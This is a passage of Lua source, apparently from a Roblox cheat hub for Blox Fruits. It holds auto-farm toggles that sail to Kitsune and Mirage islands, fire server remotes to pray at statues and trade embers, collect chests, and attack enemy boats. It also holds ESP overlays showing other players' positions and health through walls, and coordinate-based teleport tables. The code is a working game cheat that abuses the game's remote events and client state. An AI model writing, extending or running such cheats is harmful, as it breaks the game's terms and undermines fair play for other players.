                    elseif n5 == 41 then
                        v57, v58, v59 = pairs(workspace.Enemies:GetChildren())
                        v60 = v59
                        n5 = 42
                    elseif n5 == 42 then
                        v61, v62 = v57(v58, v60)

                        if v61 == nil then
                            n5 = 50
                        else
                            n5 = 43
                        end
                    elseif n5 == 43 then
                        v60 = v61

                        if v62:FindFirstChild("VehicleSeat") and v62:FindFirstChild("Health") and v62.Health.Value > 0 then
                            n5 = 44
                        else
                            n5 = 42
                        end
                    elseif n5 == 44 then
                        task.wait()

                        if v62.Name == "PirateBrigade" then
                            n5 = 46
                        else
                            n5 = 45
                        end
                    elseif n5 == 45 then
                        tween(v62.Engine.CFrame * CFrame.new(0, -50, -50))
                        n5 = 47
                    elseif n5 == 46 then
                        tween(v62.Engine.CFrame * CFrame.new(0, -30, -10))
                        n5 = 47
                    elseif n5 == 47 then
                        if localPlayer2:DistanceFromCharacter(v62.Engine.Position) <= 150 then
                            n5 = 48
                        else
                            n5 = 49
                        end
                    elseif n5 == 48 then
                        MousePos = v62.Engine.Position
                        SpamSkill()
                        n5 = 49
                    elseif n5 == 49 then
                        if _G.PGB and v62.Health.Value > 0 then
                            n5 = 44
                        else
                            n5 = 42
                        end
                    elseif n5 == 50 then
                        return
                    end
                end
            end)
        end
    end)

    v3:AddSection("Kitsune Island")

    v3:AddSlider({
        Name = "Trade Azure Ember Amount",
        Min = 10,
        Max = 25,
        Default = 20,
        Increment = 5,
        Callback = function(azureAmount)
            _G.AzureAmount = azureAmount
        end,
    })

    v3:AddToggle({
        Name = "Auto Kitsune Island",
        Default = false,
        Callback = function(kitsunefind)
            _G.kitsunefind = kitsunefind

            spawn(function()
                while wait() do
                    if _G.kitsunefind then
                        pcall(function()
                            if workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island", true) then
                                tween2(workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island").CFrame * CFrame.new(0, 500, 0))
                            else
                                local v15 = CheckBoat()

                                if v15 then
                                    if localPlayer2.Character.Humanoid.Sit == false then
                                        local n5 = v15.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                                        tween2(n5)
                                    else
                                        local cframe = CFrame.new(-10000000, 31, 37016.25)

                                        repeat
                                            wait()

                                            if not CheckEnemiesBoat() and not CheckTerrorShark() and not CheckPirateGrandBrigade() then
                                                tween2(CFrame.new(-10000000, 31, 37016.25))
                                            else
                                                tween2(CFrame.new(-10000000, 150, 37016.25))
                                            end
                                        until not _G.kitsunefind or (cframe.Position - localPlayer2.Character.HumanoidRootPart.Position).Magnitude <= 10 or workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") or localPlayer2.Character.Humanoid.Sit == false

                                        localPlayer2.Character.Humanoid.Sit = false
                                    end
                                else
                                    local cframe = CFrame.new(-16927.451, 9.086, 433.864)
                                    tween2(cframe)

                                    if (cframe.Position - localPlayer2.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                        ReplicatedStorage2.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                                    end
                                end
                            end
                        end)
                    end
                end
            end)
        end,
    })

    v3:AddToggle({
        Name = "Auto Teleport to Shrine Actived",
        Default = false,
        Callback = function(tweenShrine)
            _G.tweenShrine = tweenShrine

            if tweenShrine then
                spawn(function()
                    while _G.tweenShrine do
                        task.wait(0.1)

                        pcall(function()
                            local kitsuneIsland, kitsuneIsland2, shrineActive, v15, descendants, v16, v17, v18, v19, n5
                            n5 = 1

                            while true do
                                if n5 == 1 then
                                    kitsuneIsland = workspace.Map:FindFirstChild("KitsuneIsland")
                                    kitsuneIsland2 = kitsuneIsland

                                    if kitsuneIsland then
                                        n5 = 3
                                    else
                                        n5 = 2
                                    end
                                elseif n5 == 2 then
                                    kitsuneIsland2 = game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island")
                                    n5 = 3
                                elseif n5 == 3 then
                                    if kitsuneIsland2 then
                                        n5 = 4
                                    else
                                        n5 = 11
                                    end
                                elseif n5 == 4 then
                                    shrineActive = kitsuneIsland2:FindFirstChild("ShrineActive")

                                    if shrineActive then
                                        n5 = 5
                                    else
                                        n5 = 10
                                    end
                                elseif n5 == 5 then
                                    v15 = next
                                    descendants, v16 = shrineActive:GetDescendants()
                                    v17 = v16
                                    n5 = 6
                                elseif n5 == 6 then
                                    v18, v19 = v15(descendants, v17)

                                    if v18 == nil then
                                        n5 = 11
                                    else
                                        n5 = 7
                                    end
                                elseif n5 == 7 then
                                    v17 = v18

                                    if v19:IsA("BasePart") and v19.Name:find("NeonShrinePart") then
                                        n5 = 8
                                    else
                                        n5 = 6
                                    end
                                elseif n5 == 8 then
                                    ReplicatedStorage2.Modules.Net:FindFirstChild("RE/TouchKitsuneStatue"):FireServer()
                                    n5 = 9
                                elseif n5 == 9 then
                                    task.wait()
                                    tween(v19.CFrame * CFrame.new(0, 2, 0))

                                    if _G.tweenShrine and kitsuneIsland2 then
                                        n5 = 9
                                    else
                                        n5 = 6
                                    end
                                elseif n5 == 10 then
                                    tween(workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island").CFrame * CFrame.new(0, 500, 0))
                                    n5 = 11
                                elseif n5 == 11 then
                                    return
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Auto Trade Azure Ember",
        Default = false,
        Callback = function(tradeEmber)
            _G.Trade_Ember = tradeEmber

            if tradeEmber then
                spawn(function()
                    while _G.Trade_Ember do
                        task.wait(0.1)

                        pcall(function()
                            if workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island", true) then
                                local Lighting_ = game:GetService("Lighting")
                                local fragments = localPlayer2.Data:FindFirstChild("Fragments")
                                local n5 = fragments and localPlayer2.Data.Fragments.Value or 0

                                if Lighting_:GetAttribute("IsBlueMoon") and not Lighting_:GetAttribute("BlueMoonEnded") then
                                    local azureAmount = _G.AzureAmount
                                    local n6 = azureAmount or 20

                                    if n6 <= n5 then
                                        ReplicatedStorage2.Modules.Net:FindFirstChild("RF/KitsuneStatuePray"):InvokeServer()
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Auto Collect Azure Ember",
        Default = false,
        Callback = function(collectEmber)
            _G.Collect_Ember = collectEmber

            if collectEmber then
                spawn(function()
                    while _G.Collect_Ember do
                        task.wait(0.1)

                        pcall(function()
                            if not workspace:WaitForChild("AttachedAzureEmber") and not workspace:WaitForChild("EmberTemplate") then
                                tween(workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island").CFrame * CFrame.new(0, 500, 0))
                                ReplicatedStorage2.Modules.Net:FindFirstChild("RF/KitsuneStatuePray"):InvokeServer()
                            else
                                local emberTemplate = workspace:WaitForChild("EmberTemplate")

                                if emberTemplate and emberTemplate:FindFirstChild("Part") then
                                    fn(emberTemplate.Part.CFrame)
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    local localPlayer3 = game:GetService("Players").LocalPlayer
    local map2 = workspace:WaitForChild("Map")
    workspace:WaitForChild("_WorldOrigin"):WaitForChild("Locations")
    local Lighting_ = game:GetService("Lighting")
    local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
    v3:AddSection("Mirage Island")
    local v15 = v3:AddParagraph("Full Moon", "")

    task.spawn(function()
        local tbl5 = {
            ["http://www.roblox.com/asset/?id=9709135895"] = "Moon: 0 / 8",
            ["http://www.roblox.com/asset/?id=9709139597"] = "Moon: 1 / 8",
            ["http://www.roblox.com/asset/?id=9709143733"] = "Moon: 2 / 8",
            ["http://www.roblox.com/asset/?id=9709149052"] = "Next Night",
            ["http://www.roblox.com/asset/?id=9709149431"] = "Full Moon",
            ["http://www.roblox.com/asset/?id=9709149680"] = "Last Night",
            ["http://www.roblox.com/asset/?id=9709150086"] = "Moon: 6 / 8",
            ["http://www.roblox.com/asset/?id=9709150401"] = "Moon: 7 / 8",
        }

        while task.wait(0.2) do
            pcall(function()
                local v16 = tbl5[CheckMatTrang()]
                local fullMoon = v16 or "Unknown"
                v15:Set("Full Moon: " .. fullMoon)
            end)
        end
    end)

    v3:AddToggle({
        Name = "Auto Mirage Island",
        Default = false,
        Callback = function(findMirage)
            _G.FindMirage = findMirage
        end,
    })

    spawn(function()
        while wait() do
            if _G.FindMirage then
                pcall(function()
                    if workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island", true) then
                        if localPlayer3.Character.Humanoid.Sit then
                            localPlayer3.Character.Humanoid.Sit = false
                            task.wait(0.2)
                        end

                        tween2(workspace.Map.MysticIsland.Center.CFrame * CFrame.new(0, 300, 0))
                    else
                        local v16 = CheckBoat()

                        if v16 then
                            if localPlayer3.Character.Humanoid.Sit == false then
                                local n5 = v16.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                                tween2(n5)
                            else
                                local cframe

                                repeat
                                    wait()
                                    cframe = CFrame.new(-10000000, 31, 37016.25)

                                    if not CheckEnemiesBoat() and not CheckTerrorShark() and not CheckPirateGrandBrigade() then
                                        tween2(cframe)
                                    else
                                        tween2(CFrame.new(-10000000, 150, 37016.25))
                                    end
                                until not _G.FindMirage or (cframe.Position - localPlayer3.Character.HumanoidRootPart.Position).Magnitude <= 10 or workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") or localPlayer3.Character.Humanoid.Sit == false

                                localPlayer3.Character.Humanoid.Sit = false
                            end
                        else
                            local cframe = CFrame.new(-16927.451, 9.086, 433.864)
                            tween2(cframe)

                            if (cframe.Position - localPlayer3.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                ReplicatedStorage3.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                            end
                        end
                    end
                end)
            end
        end
    end)

    v3:AddToggle({
        Name = "Teleport To Mirage Top",
        Default = false,
        Callback = function(highestMirage)
            _G.HighestMirage = highestMirage

            if highestMirage then
                spawn(function()
                    while _G.HighestMirage do
                        task.wait(1)

                        pcall(function()
                            local mysticIsland = map2:FindFirstChild("MysticIsland")

                            if mysticIsland then
                                local center = mysticIsland:FindFirstChild("Center")

                                if center then
                                    tween(center.CFrame * CFrame.new(0, 400, 0))
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Auto Look Moon",
        Default = false,
        Callback = function(lookMoon)
            _G.LookMoon = lookMoon

            if lookMoon then
                task.spawn(function()
                    while _G.LookMoon do
                        task.wait()

                        pcall(function()
                            local currentCamera = workspace.CurrentCamera
                            local moonDirection = Lighting_:GetMoonDirection()
                            currentCamera.CFrame = CFrame.new(currentCamera.CFrame.Position, moonDirection + currentCamera.CFrame.Position)
                            localPlayer3.Character.HumanoidRootPart.CFrame = CFrame.new(localPlayer3.Character.HumanoidRootPart.Position, moonDirection + localPlayer3.Character.HumanoidRootPart.Position)
                            task.wait(0.1)
                            ReplicatedStorage3.Remotes.CommE:FireServer("ActivateAbility")
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Teleport To Gear",
        Default = false,
        Callback = function(tpgear)
            _G.TPGEAR = tpgear

            if tpgear then
                spawn(function()
                    while _G.TPGEAR do
                        task.wait(0.1)

                        pcall(function()
                            local mysticIsland = map2:FindFirstChild("MysticIsland")

                            if mysticIsland then
                                for k, child in pairs(mysticIsland:GetChildren()) do
                                    if child:IsA("MeshPart") and child.Name == "Part" and child.MeshId == "rbxassetid://10153114969" then
                                        tween(child.CFrame)
                                        return
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Easy See Gear",
        Default = false,
        Callback = function(easySeeGear)
            _G.EasySeeGear = easySeeGear

            if easySeeGear then
                spawn(function()
                    while _G.EasySeeGear do
                        task.wait(1)

                        pcall(function()
                            local mysticIsland = map2:FindFirstChild("MysticIsland")

                            if mysticIsland then
                                for k, child in pairs(mysticIsland:GetChildren()) do
                                    if child:IsA("BasePart") and child.Name == "Part" then
                                        if child:IsA("MeshPart") then
                                            child.Transparency = 0
                                        else
                                            child.Transparency = 1
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Teleport To Fruit Dealer",
        Default = false,
        Callback = function(addealer)
            _G.Addealer = addealer

            if addealer then
                spawn(function()
                    while _G.Addealer do
                        task.wait()

                        pcall(function()
                            for k, child in pairs(ReplicatedStorage3.NPCs:GetChildren()) do
                                if child.Name == "Advanced Fruit Dealer" then
                                    local humanoidRootPart2 = child:FindFirstChild("HumanoidRootPart")

                                    if humanoidRootPart2 then
                                        tween(humanoidRootPart2.CFrame)
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Collect Mirage Chests",
        Default = false,
        Callback = function(farmChestM)
            _G.FarmChestM = farmChestM

            if farmChestM then
                spawn(function()
                    while _G.FarmChestM do
                        task.wait(0.2)

                        pcall(function()
                            local mysticIsland = map2:FindFirstChild("MysticIsland")

                            if mysticIsland then
                                local ruong = mysticIsland:FindFirstChild("ruong")

                                if ruong and (ruong:FindFirstChild("DiamondChest") or ruong:FindFirstChild("FragChest")) then
                                    local CollectionService = game:GetService("CollectionService")
                                    local character = localPlayer3.Character
                                    local result = character or localPlayer3.CharacterAdded:Wait()

                                    if result and result:FindFirstChild("HumanoidRootPart") then
                                        local position = result:GetPivot().Position
                                        local tagged = CollectionService:GetTagged("_ChestTagged")
                                        local huge = math.huge
                                        local v16 = nil

                                        for i = 1, #tagged do
                                            local v17 = tagged[i]

                                            if v17:IsDescendantOf(mysticIsland) and not v17:GetAttribute("IsDisabled") then
                                                local magnitude = (v17:GetPivot().Position - position).Magnitude

                                                if magnitude < huge then
                                                    huge = magnitude
                                                    v16 = v17
                                                end
                                            end
                                        end

                                        if v16 then
                                            tween(v16:GetPivot())
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })
end

v7:AddSection("Esp")

local tbl2 = {
    Player = Color3.fromRGB(255, 255, 255),
    Fruit = Color3.fromRGB(255, 0, 0),
    FlowerBlue = Color3.fromRGB(100, 200, 255),
    FlowerRed = Color3.fromRGB(255, 100, 150),
    Island = Color3.fromRGB(0, 255, 255),
    Chest1 = Color3.fromRGB(150, 150, 150),
    Chest2 = Color3.fromRGB(255, 255, 0),
    Chest3 = Color3.fromRGB(0, 255, 255),
    Berry = Color3.fromRGB(150, 255, 100),
    Gear = Color3.fromRGB(255, 150, 50),
}

local function fn3(adornee, arg)
    if adornee and adornee:FindFirstChild("ESP_REDzHUB") then
        return
    end
    local folder = Instance.new("Folder", adornee)
    folder.Name = "ESP_REDzHUB"
    local boxHandleAdornment = Instance.new("BoxHandleAdornment", folder)
    boxHandleAdornment.Size = Vector3.new(1, 0, 1, 0)
    boxHandleAdornment.Name = "ESP_REDzHUB"
    boxHandleAdornment.AlwaysOnTop = true
    boxHandleAdornment.ZIndex = 10
    boxHandleAdornment.Transparency = 0
    local billboardGui = Instance.new("BillboardGui", boxHandleAdornment)
    billboardGui.Adornee = adornee
    billboardGui.Size = UDim2.new(0, 100, 0, 150)
    billboardGui.StudsOffset = Vector3.new(0, 1, 0)
    billboardGui.AlwaysOnTop = true
    local textLabel = Instance.new("TextLabel", billboardGui)
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0, 0, 0, -50)
    textLabel.Size = UDim2.new(0, 100, 0, 100)
    textLabel.TextSize = 10
    textLabel.TextStrokeTransparency = 0
    textLabel.TextYAlignment = Enum.TextYAlignment.Bottom
    textLabel.Text = "..."
    textLabel.ZIndex = 15
    textLabel.RichText = true

    task.spawn(function()
        while task.wait() do
            pcall(function()
                local character = Player.Character
                local humanoidRootPart2 = character and Player.Character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart2 or not adornee then
                    return
                end
                local n = math.floor((humanoidRootPart2.Position - adornee.Position).Magnitude / 3)

                if adornee.Name == "HumanoidRootPart" and adornee.Parent:FindFirstChild("Humanoid") then
                    local n2 = math.floor(adornee.Parent.Humanoid.Health)
                    local n3 = math.floor(adornee.Parent.Humanoid.MaxHealth)
                    textLabel.Text = "<font color=\"rgb(255,255,255)\">" .. adornee.Parent.Name .. " <font color=\"rgb(180,180,180)\">[ " .. n .. " ]</font></font>\n<font color=\"rgb(0,255,0)\">[" .. n2 .. "/" .. n3 .. "]</font>"
                elseif adornee.Name == "Handle" then
                    textLabel.TextColor3 = tbl2.Fruit
                    textLabel.Text = "Fruit [ " .. adornee.Parent.Name .. " ] < " .. n .. " >"
                elseif string.find(adornee.Name, "Berry") then
                    textLabel.TextColor3 = tbl2.Berry
                    textLabel.Text = adornee.Name .. " < " .. n .. " >"
                else
                    local color = arg or Color3.fromRGB(255, 255, 255)
                    textLabel.TextColor3 = color
                    textLabel.Text = adornee.Name .. " < " .. n .. " >"
                end
            end)
        end
    end)
end

local function fn4(arg)
    if arg and arg:FindFirstChild("ESP_REDzHUB") then
        arg.ESP_REDzHUB:Destroy()
    end
end

local function fn5()
    local v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, n
    n = 1

    while true do
        if n == 1 then
            if getgenv().EspPlayers then
                n = 2
            else
                n = 6
            end
        elseif n == 2 then
            task.wait()
            v10, v11, v12 = pairs(game:GetService("Players"):GetPlayers())
            v13 = v12
            n = 3
        elseif n == 3 then
            v14, v15 = v10(v11, v13)

            if v14 == nil then
                n = 1
            else
                n = 4
            end
        elseif n == 4 then
            v13 = v14

            if v15.Name ~= Player.Name and v15.Character and v15.Character:FindFirstChild("HumanoidRootPart") then
                n = 5
            else
                n = 3
            end
        elseif n == 5 then
            fn3(v15.Character.HumanoidRootPart, tbl2.Player)
            n = 3
        elseif n == 6 then
            v16, v17, v18 = pairs(game:GetService("Players"):GetPlayers())
            v19 = v18
            n = 7
        elseif n == 7 then
            v20, v21 = v16(v17, v19)

            if v20 == nil then
                n = 10
            else
                n = 8
            end
        elseif n == 8 then
            v19 = v20

            if v21.Character and v21.Character:FindFirstChild("HumanoidRootPart") then
                n = 9
            else
                n = 7
            end
        elseif n == 9 then
            fn4(v21.Character.HumanoidRootPart)
            n = 7
        elseif n == 10 then
            return
        end
    end
end

local function fn6()
    local v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, n
    n = 1

    while true do
        if n == 1 then
            if getgenv().EspFruits then
                n = 2
            else
                n = 6
            end
        elseif n == 2 then
            task.wait()
            v10, v11, v12 = pairs(workspace:GetChildren())
            v13 = v12
            n = 3
        elseif n == 3 then
            v14, v15 = v10(v11, v13)

            if v14 == nil then
                n = 1
            else
                n = 4
            end
        elseif n == 4 then
            v13 = v14

            if v15 and (v15:IsA("Tool") and v15:FindFirstChild("Handle") or string.find(v15.Name, "Fruit") and v15:FindFirstChild("Handle")) then
                n = 5
            else
                n = 3
            end
        elseif n == 5 then
            fn3(v15.Handle, tbl2.Fruit)
            n = 3
        elseif n == 6 then
            v16, v17, v18 = pairs(workspace:GetChildren())
            v19 = v18
            n = 7
        elseif n == 7 then
            v20, v21 = v16(v17, v19)

            if v20 == nil then
                n = 10
            else
                n = 8
            end
        elseif n == 8 then
            v19 = v20

            if v21 and v21:FindFirstChild("Handle") then
                n = 9
            else
                n = 7
            end
        elseif n == 9 then
            fn4(v21.Handle)
            n = 7
        elseif n == 10 then
            return
        end
    end
end

local function fn7()
    local tagged, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, n
    n = 1

    while true do
        if n == 1 then
            if getgenv().EspBerries then
                n = 2
            else
                n = 5
            end
        elseif n == 2 then
            task.wait()
            tagged = game:GetService("CollectionService"):GetTagged("BerryBush")
            v10, v11, v12 = ipairs(tagged)
            v13 = v12
            n = 3
        elseif n == 3 then
            v14, v15 = v10(v11, v13)

            if v14 == nil then
                n = 1
            else
                n = 4
            end
        elseif n == 4 then
            v13 = v14

            pcall(function()
                local position = v15.Parent:GetPivot().Position

                for k, v22 in pairs(v15:GetAttributes()) do
                    if v22 and type(v22) == "string" then
                        local name = "BerryEspPart_" .. v22 .. "_" .. tostring(position)
                        local v23 = workspace:FindFirstChild(name)
                        local v24 = v23

                        if not v23 then
                            local part = Instance.new("Part")
                            v24 = part
                            part.Name = name
                            part.Transparency = 1
                            part.Size = Vector3.new(1, 1, 1)
                            part.Anchored = true
                            part.CanCollide = false
                            part.Parent = workspace
                            part.CFrame = CFrame.new(position)
                        end

                        fn3(v24, tbl2.Berry)
                    end
                end
            end)

            n = 3
        elseif n == 5 then
            v16, v17, v18 = ipairs(workspace:GetChildren())
            v19 = v18
            n = 6
        elseif n == 6 then
            v20, v21 = v16(v17, v19)

            if v20 == nil then
                n = 9
            else
                n = 7
            end
        elseif n == 7 then
            v19 = v20

            if v21:IsA("Part") and v21.Name:match("BerryEspPart_.*") then
                n = 8
            else
                n = 6
            end
        elseif n == 8 then
            fn4(v21)
            v21:Destroy()
            n = 6
        elseif n == 9 then
            return
        end
    end
end

local function fn8()
    local tagged, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, n
    n = 1

    while true do
        if n == 1 then
            if getgenv().EspChests then
                n = 2
            else
                n = 5
            end
        elseif n == 2 then
            task.wait()
            tagged = game:GetService("CollectionService"):GetTagged("_ChestTagged")
            v10, v11, v12 = pairs(tagged)
            v13 = v12
            n = 3
        elseif n == 3 then
            v14, v15 = v10(v11, v13)

            if v14 == nil then
                n = 1
            else
                n = 4
            end
        elseif n == 4 then
            v13 = v14

            pcall(function()
                local isBasePart = v15:IsA("BasePart")
                local basePart = isBasePart and v15 or v15:FindFirstChildWhichIsA("BasePart")

                if basePart then
                    local name = basePart.Name

                    if string.find(name, "1") then
                        fn3(basePart, tbl2.Chest1)
                    elseif string.find(name, "2") then
                        fn3(basePart, tbl2.Chest2)
                    elseif string.find(name, "3") then
                        fn3(basePart, tbl2.Chest3)
                    else
                        fn3(basePart, tbl2.Chest1)
                    end
                end
            end)

            n = 3
        elseif n == 5 then
            v16, v17, v18 = pairs(game:GetService("CollectionService"):GetTagged("_ChestTagged"))
            v19 = v18
            n = 6
        elseif n == 6 then
            v20, v21 = v16(v17, v19)

            if v20 == nil then
                n = 8
            else
                n = 7
            end
        elseif n == 7 then
            v19 = v20

            pcall(function()
                local isBasePart = v21:IsA("BasePart")
                local basePart = isBasePart and v21 or v21:FindFirstChildWhichIsA("BasePart")

                if basePart then
                    fn4(basePart)
                end
            end)

            n = 6
        elseif n == 8 then
            return
        end
    end
end

local function fn9()
    local locations, v10, v11, v12, v13, v14, v15, locations2, v16, v17, v18, v19, v20, v21, n
    n = 1

    while true do
        if n == 1 then
            if getgenv().EspIslands then
                n = 2
            else
                n = 6
            end
        elseif n == 2 then
            task.wait()
            locations = workspace:WaitForChild("_WorldOrigin", 9000000000):WaitForChild("Locations", 9000000000)
            v10, v11, v12 = pairs(locations:GetChildren())
            v13 = v12
            n = 3
        elseif n == 3 then
            v14, v15 = v10(v11, v13)

            if v14 == nil then
                n = 1
            else
                n = 4
            end
        elseif n == 4 then
            v13 = v14

            if v15 and v15.Name ~= "Sea" then
                n = 5
            else
                n = 3
            end
        elseif n == 5 then
            fn3(v15, tbl2.Island)
            n = 3
        elseif n == 6 then
            locations2 = workspace:WaitForChild("_WorldOrigin", 9000000000):WaitForChild("Locations", 9000000000)
            v16, v17, v18 = pairs(locations2:GetChildren())
            v19 = v18
            n = 7
        elseif n == 7 then
            v20, v21 = v16(v17, v19)

            if v20 == nil then
                n = 9
            else
                n = 8
            end
        elseif n == 8 then
            v19 = v20
            fn4(v21)
            n = 7
        elseif n == 9 then
            return
        end
    end
end

local function fn10()
    local v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, n
    n = 1

    while true do
        if n == 1 then
            if getgenv().EspGear then
                n = 2
            else
                n = 6
            end
        elseif n == 2 then
            task.wait()
            v10, v11, v12 = pairs(workspace.Map.MysticIsland:GetDescendants())
            v13 = v12
            n = 3
        elseif n == 3 then
            v14, v15 = v10(v11, v13)

            if v14 == nil then
                n = 1
            else
                n = 4
            end
        elseif n == 4 then
            v13 = v14

            if v15:IsA("BasePart") and v15.Name == "Part" and v15.Material == Enum.Material.Neon then
                n = 5
            else
                n = 3
            end
        elseif n == 5 then
            fn3(v15, tbl2.Gear)
            n = 3
        elseif n == 6 then
            v16, v17, v18 = pairs(workspace.Map.MysticIsland:GetDescendants())
            v19 = v18
            n = 7
        elseif n == 7 then
            v20, v21 = v16(v17, v19)

            if v20 == nil then
                n = 10
            else
                n = 8
            end
        elseif n == 8 then
            v19 = v20

            if v21:IsA("BasePart") and v21.Name == "Part" and v21.Material == Enum.Material.Neon then
                n = 9
            else
                n = 7
            end
        elseif n == 9 then
            fn4(v21)
            n = 7
        elseif n == 10 then
            return
        end
    end
end

v7:AddToggle({
    Name = "Esp Players",
    Default = false,
    Callback = function(espPlayers)
        getgenv().EspPlayers = espPlayers

        if espPlayers then
            task.spawn(fn5)
        end
    end,
})

v7:AddToggle({
    Name = "Esp Fruits",
    Default = false,
    Callback = function(espFruits)
        getgenv().EspFruits = espFruits

        if espFruits then
            task.spawn(fn6)
        end
    end,
})

v7:AddToggle({
    Name = "Esp Berries",
    Default = false,
    Callback = function(espBerries)
        getgenv().EspBerries = espBerries

        if espBerries then
            task.spawn(fn7)
        end
    end,
})

v7:AddToggle({
    Name = "Esp Chests",
    Default = false,
    Callback = function(espChests)
        getgenv().EspChests = espChests

        if espChests then
            task.spawn(fn8)
        end
    end,
})

v7:AddToggle({
    Name = "Esp Islands",
    Default = false,
    Callback = function(espIslands)
        getgenv().EspIslands = espIslands

        if espIslands then
            task.spawn(fn9)
        end
    end,
})

v7:AddToggle({
    Name = "Esp Gear",
    Default = false,
    Callback = function(espGear)
        getgenv().EspGear = espGear

        if espGear then
            task.spawn(fn10)
        end
    end,
})

v6:AddSection("World")

if World2 or World3 then
    v6:AddButton({
        Name = "Teleport to Sea 1",
        Description = "Main",
        Callback = function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
        end,
    })
end

if World1 or World3 then
    v6:AddButton({
        Name = "Teleport to Sea 2",
        Description = "Dressrosa",
        Callback = function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
        end,
    })
end

if World1 or World2 then
    v6:AddButton({
        Name = "Teleport to Sea 3",
        Description = "Zou",
        Callback = function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
        end,
    })
end

v6:AddSection("Island")
local tbl3 = {}

if World1 then
    tbl3 = {
        "WindMill",
        "Marine",
        "Middle Town",
        "Jungle",
        "Pirate Village",
        "Desert",
        "Snow Island",
        "MarineFord",
        "Colosseum",
        "Sky Island 1",
        "Sky Island 2",
        "Sky Island 3",
        "Prison",
        "Magma Village",
        "Under Water Island",
        "Fountain City",
        "Shank Room",
        "Mob Island",
    }
elseif World2 then
    tbl3 = {
        "The Cafe",
        "Frist Spot",
        "Dark Area",
        "Flamingo Mansion",
        "Flamingo Room",
        "Green Zone",
        "Factory",
        "Colossuim",
        "Zombie Island",
        "Two Snow Mountain",
        "Punk Hazard",
        "Cursed Ship",
        "Ice Castle",
        "Forgotten Island",
        "Ussop Island",
        "Mini Sky Island",
    }
elseif World3 then
    tbl3 = {
        "Mansion",
        "Port Town",
        "Great Tree",
        "Castle On The Sea",
        "MiniSky",
        "Hydra Island",
        "Floating Turtle",
        "Haunted Castle",
        "Ice Cream Island",
        "Peanut Island",
        "Cake Island",
        "Cocoa Island",
        "Candy Island",
        "Tiki Outpost",
        "Submerged Island",
    }
end

local tbl4 = {
    WindMill = CFrame.new(979.79, 16.51, 1429.04),
    Marine = CFrame.new(-2566.42, 6.85, 2045.25),
    ["Middle Town"] = CFrame.new(-690.33, 15.09, 1582.23),
    Jungle = CFrame.new(-1612.79, 36.85, 149.12),
    ["Pirate Village"] = CFrame.new(-1181.3, 4.75, 3803.54),
    Desert = CFrame.new(944.15, 20.91, 4373.3),
    ["Snow Island"] = CFrame.new(1347.8, 104.66, -1319.73),
    MarineFord = CFrame.new(-4914.82, 50.96, 4281.02),
    Colosseum = CFrame.new(-1427.62, 7.28, -2792.77),
    ["Sky Island 1"] = CFrame.new(-4869.1, 733.46, -2667.01),
    ["Sky Island 2"] = "ENTRANCE1",
    ["Sky Island 3"] = "ENTRANCE2",
    ["Under Water Island"] = "UNDERWATER",
    Prison = CFrame.new(4875.33, 5.65, 734.85),
    ["Magma Village"] = CFrame.new(-5247.71, 12.88, 8504.96),
    ["Fountain City"] = CFrame.new(5127.12, 59.5, 4105.44),
    ["Shank Room"] = CFrame.new(-1442.16, 29.87, -28.35),
    ["Mob Island"] = CFrame.new(-2850.2, 7.39, 5354.99),
    ["The Cafe"] = CFrame.new(-380.47, 77.22, 255.82),
    ["Frist Spot"] = CFrame.new(-11.31, 29.27, 2771.52),
    ["Dark Area"] = CFrame.new(3780.03, 22.65, -3498.58),
    ["Flamingo Mansion"] = CFrame.new(-483.73, 332.03, 595.32),
    ["Flamingo Room"] = CFrame.new(2284.41, 15.15, 875.72),
    ["Green Zone"] = CFrame.new(-2448.53, 73.01, -3210.63),
    Factory = CFrame.new(424.12, 211.16, -427.54),
    Colossuim = CFrame.new(-1503.62, 219.79, 1369.31),
    ["Zombie Island"] = CFrame.new(-5622.03, 492.19, -781.78),
    ["Two Snow Mountain"] = CFrame.new(753.14, 408.23, -5274.61),
    ["Punk Hazard"] = CFrame.new(-6127.65, 15.95, -5040.28),
    ["Cursed Ship"] = CFrame.new(923.4, 125.05, 32885.87),
    ["Ice Castle"] = CFrame.new(6148.41, 294.38, -6741.11),
    ["Forgotten Island"] = CFrame.new(-3032.76, 317.89, -10075.37),
    ["Ussop Island"] = CFrame.new(4816.86, 8.45, 2863.81),
    ["Mini Sky Island"] = CFrame.new(-288.74, 49326.31, -35248.59),
